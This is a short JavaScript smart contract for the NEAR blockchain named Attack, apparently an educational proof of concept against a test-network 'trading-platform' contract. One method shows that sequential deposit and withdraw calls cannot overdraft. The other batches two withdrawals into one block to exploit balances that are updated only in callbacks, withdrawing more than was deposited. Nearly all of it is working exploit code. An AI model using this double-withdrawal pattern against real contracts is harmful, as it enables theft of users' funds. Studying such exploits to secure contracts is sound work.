import { NearBindgen, call, NearPromise } from 'near-sdk-js';

const GAS = 50_000_000_000_000n;
const NO_DEPOSIT = 0n;

@NearBindgen({})
class Attack {
  @call({})
  attack() {
    // return this.case1();
    return this.case2();
  }

  /**
   * Everything is run sequentially, so you are not able to overdraft your balance in the trading platform contract.
   */
  case1() {
    const balance = 10n * 10n ** 24n; // 10 NEAR

    return NearPromise.new('trading-platform.test.near')
      .functionCall('near_deposit', '', balance, GAS)
      .then(
        NearPromise.new('trading-platform.test.near').functionCall(
          'near_withdraw',
          JSON.stringify({ amount: balance.toString() }),
          NO_DEPOSIT,
          GAS,
        ),
      )
      .then(
        NearPromise.new('trading-platform.test.near').functionCall(
          'near_withdraw',
          JSON.stringify({ amount: balance.toString() }),
          NO_DEPOSIT,
          GAS,
        ),
      );
  }

  /**
   * Here both withdrawals are executed in the same block, while callbacks are executed in the next block. As balance
   * is updated in the callback, you are able to withdraw more than you deposited.
   */
  case2() {
    const balance = 10n * 10n ** 24n; // 10 NEAR

    return NearPromise.new('trading-platform.test.near')
      .functionCall('near_deposit', '', balance, GAS)
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: balance.toString() }),
        NO_DEPOSIT,
        GAS,
      )
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: balance.toString() }),
        NO_DEPOSIT,
        GAS,
      );
  }
}
